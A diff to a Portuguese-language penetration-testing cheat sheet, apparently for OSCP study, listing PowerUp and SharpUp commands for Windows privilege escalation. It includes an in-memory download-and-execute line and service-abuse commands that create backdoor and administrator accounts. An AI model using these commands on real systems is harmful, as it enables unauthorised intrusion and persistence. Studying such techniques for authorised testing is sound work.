@@ -852,8 +852,8 @@ Seatbelt.exe -group=all
 .\Seatbelt.exe -group=all
 ```
 # PRIVILEGE ESCALATION WINDOWS
-## TOOLS
-##### [POWERUP](https://blog.certcube.com/powerup-cheatsheet/)
+## [POWERUP](https://blog.certcube.com/powerup-cheatsheet/)
+##### POWERUP DOWNLOAD
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1")
 ```
@@ -861,57 +861,56 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 curl https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1  -Outfile PowerUp.ps1
 import-module .\PowerUp.ps1
 ```
-CHECAR TUDO
+##### POWERUP - CHECAR TUDO
 ```
 invoke-allchecks
 ```
-ACHAR UNQUOTED SERVICE
+##### POWERUP - ACHAR UNQUOTED SERVICE
 ```
 Get-Serviceunquoted -Verbose
 ```
-ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENTOS
+##### POWERUP - ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENTOS
 ```
 Get-ModifiableServiceFile -Verbose
 ```
-POWERUP - EXEMPLOS
+##### POWERUP - EXEMPLOS
 ```
 Get-ModifiableService -verbose
 ```
-##### POWERUP - EXEMPLOS DE ATAQUES:
-ADICIONAR USUARIO JOHN COM SENHA: Password123!
+##### POWERUP ATAQUE - ADICIONAR USUARIO JOHN COM SENHA: Password123!
 ```
 Invoke-ServiceAbuse -Name VulnSVC   
 Get-Service VulnSVC | Invoke-ServiceAbuse
 ```
-ADICIONAR AOS ADMINISTRADORES:
+##### POWERUP ATAQUE - ADICIONAR AOS ADMINISTRADORES
 ```
 Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"
 ```
-ADICIONAR USUARIO, SENHA E ADICIONAR NO GRUPO
+##### POWERUP ATAQUE - ADICIONAR USUARIO, SENHA E ADICIONAR NO GRUPO
 ```
 Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
 ```
-EXECCUTAR COMANDO:
+##### POWERUP ATAQUE - EXECCUTAR COMANDO:
 ```
 Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."
 ```
-##### SHARPUP
+## SHARPUP
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/SharpUp.exe -Outfile SharpUp.exe
 ```
-CHECAR TUDO
+##### SHARPUP - CHECAR TUDO
 ```
 .\SharpUp.exe
 .\SharpUp.exe > result.txt
 .\SharpUp.exe audit
 .\SharpUp.exe audit > result.txt
 ```
-SHARPUP - EXEMPLOS
+##### SHARPUP - EXEMPLOS
 ```
 .\ SharpUp.exe ModifiableServiceBinaries
 .\SharpUp.exe audit ModifiableServiceBinaries
 ```
-SHARPUP - OPÇÕES
+##### SHARPUP - OPÇÕES
 ```
 .\SharpUp.exe AlwaysInstallElevated
 .\SharpUp.exe CachedGPPPassword
